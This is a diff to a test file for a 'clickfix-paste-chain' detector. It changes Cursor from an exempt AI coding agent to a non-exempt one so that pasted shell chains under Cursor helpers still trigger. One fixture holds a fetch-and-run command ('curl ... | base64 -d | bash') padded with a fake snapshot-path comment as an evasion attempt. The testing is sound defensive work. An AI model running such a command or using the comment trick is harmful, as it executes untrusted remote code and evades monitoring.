@@ -98,7 +98,6 @@ describe('clickfix-paste-chain', () => {
     ['Claude Code (npm)', '.claude/shell-snapshots', img({ path: '/usr/local/bin/node', args: ['node', '/usr/local/lib/node_modules/@anthropic-ai/claude-code/cli.js'], seq: 0 })],
     ['Claude Code (bun)', '.claude/shell-snapshots', img({ path: '/Users/u/.bun/bin/bun', args: ['bun', '/x/claude-code/cli.js'], seq: 0 })],
     ['Codex', '.codex/shell_snapshots', img({ path: '/opt/homebrew/bin/codex', seq: 0 })],
-    ['Cursor', '.cursor/shell-snapshots', img({ path: '/Applications/Cursor.app/Contents/MacOS/Cursor', seq: 0 })],
   ];
   test.each(AGENTS)('a pasted-looking chain under the real agent shell is ignored: %s', (_, dir, agent) => {
     expect(hits(underAgent(agent, SNAP(dir)))).toHaveLength(0);
@@ -109,6 +108,14 @@ describe('clickfix-paste-chain', () => {
       img({ path: '/Applications/Visual Studio Code.app/Contents/MacOS/Electron', seq: 0 }), img({ path: '/usr/local/bin/node', args: ['node', '/Users/u/app.js'], seq: 0 })]) {
       expect(hits(underAgent(parent, SNAP(dir))), `${dir} under ${parent.path}`).toHaveLength(1);
     }
+  });
+  // Cursor is deliberately not an exempt agent: its helpers also run a workspace's tasks.json commands.
+  test.each([
+    ['a Cursor snapshot prefix', SNAP('.cursor/shell-snapshots')],
+    ['a trailing snapshot comment', apple('/bin/zsh', ['zsh', '-c', 'curl -k https://x/y | base64 -d | bash # ~/.cursor/shell-snapshots/x'], { seq: 1 })],
+  ])('a shell with %s under a Cursor helper still fires', (_, shell) => {
+    const cursor = img({ path: '/Applications/Cursor.app/Contents/Frameworks/Cursor Helper (Plugin).app/Contents/MacOS/Cursor Helper (Plugin)', seq: 0 });
+    expect(hits(underAgent(cursor, shell))).toHaveLength(1);
   });
   test("an agent's own snapshot folder only counts for the matching agent", () => {
     const claude = AGENTS[0]![2];
@@ -198,7 +205,7 @@ describe('context helpers', () => {
     const claude = img({ path: '/x/claude', seq: 0 });
     expect(under(claude, '/Users/u/.claude/shell-snapshots/s.sh')).toBe(true);
     expect(under(img({ path: '/usr/local/bin/codex', seq: 0 }), '/Users/u/.codex/shell_snapshots/s.sh')).toBe(true);
-    expect(under(img({ path: '/Applications/Cursor.app/Contents/MacOS/Cursor Helper', seq: 0 }), '/Users/u/.cursor/shell-snapshots/s.sh')).toBe(true);
+    expect(under(img({ path: '/Applications/Cursor.app/Contents/MacOS/Cursor Helper', seq: 0 }), '/Users/u/.cursor/shell-snapshots/s.sh')).toBe(false);
     expect(under(claude, '/Users/u/.zshrc')).toBe(false);
     expect(under(claude, '/Users/u/claude/shell-snapshots/s.sh')).toBe(false);
     expect(under(claude, '/Users/u/.codex/shell_snapshots/s.sh')).toBe(false);
@@ -211,7 +218,7 @@ describe('context helpers', () => {
     expect(agentOf(img({ path: '/usr/local/bin/node', args: ['node', '/n/@google/gemini-cli/dist/index.js'] }))).toBe('gemini');
     expect(agentOf(img({ path: '/usr/local/bin/node', args: ['node', '/n/@openai/codex/bin/codex.js'] }))).toBe('codex');
     expect(agentOf(img({ path: '/opt/homebrew/bin/codex' }))).toBe('codex');
-    expect(agentOf(img({ path: '/Applications/Cursor.app/Contents/MacOS/Cursor' }))).toBe('cursor');
+    expect(agentOf(img({ path: '/Applications/Cursor.app/Contents/MacOS/Cursor' }))).toBeNull();
     expect(agentOf(img({ path: '/usr/local/bin/node', args: ['node', 'server.js'] }))).toBeNull();
     expect(agentOf(img({ path: '/bin/zsh', args: ['zsh', '-c', '# claude-code gemini-cli codex'] }))).toBeNull();
     expect(agentOf(img({ path: null, args: null }))).toBeNull();
